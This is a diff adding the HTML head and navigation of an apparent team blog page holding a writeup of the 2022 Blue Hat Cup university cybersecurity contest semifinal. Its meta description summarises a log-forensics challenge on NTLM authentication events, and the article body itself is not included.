@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛 Writeups By ACT Team. 2022.8.4  Misc1. 神秘的日志 给了两个日志文件，首先在系统日志中筛选ID为6038的NTLM身份验证事件，然后根据筛选结果的第二条的时间2022&#x2F;4&#x2F;17 11:27:06去安全日志中查询相同时间的登录日志  找到这条登录日志后在下方的详细信息中奖SystemTime的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup">
+<meta property="og:url" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/index.html">
+<meta property="og:site_name" content="ACT Team">
+<meta property="og:description" content="第六届”蓝帽杯“全国大学生网络安全技能大赛半决赛 Writeups By ACT Team. 2022.8.4  Misc1. 神秘的日志 给了两个日志文件，首先在系统日志中筛选ID为6038的NTLM身份验证事件，然后根据筛选结果的第二条的时间2022&#x2F;4&#x2F;17 11:27:06去安全日志中查询相同时间的登录日志  找到这条登录日志后在下方的详细信息中奖SystemTime的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/1.PNG">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/2.PNG">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/3.PNG">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180728692.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180739604.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181457776.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182436949.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183710382.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175232682.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175508502.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175252073.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184120510.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175319005.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175510599.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175651779.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175742508.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180150225.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180332104.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180516999.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180700265.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181012712.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184256493.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182015391.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182239159.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182710798.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182752286.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183125194.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183555001.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183954273.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184055576.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184639469.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181523060.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181635301.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181842265.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182234733.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190232311.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190516374.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190609747.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184901951.png">
+<meta property="og:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184954018.png">
+<meta property="article:published_time" content="2022-08-04T10:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-02T13:09:47.393Z">
+<meta property="article:author" content="ACT">
+<meta property="article:tag" content="2022">
+<meta property="article:tag" content="第六届蓝帽杯全国大学生网络安全技能大赛半决赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/1.PNG">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="ACT Team" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&text=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&is_video=false&description=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup&body=Check out this article: http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://actsec.github.io/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/&title=第六届蓝帽杯全国大学生网络安全技能大赛半决赛Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
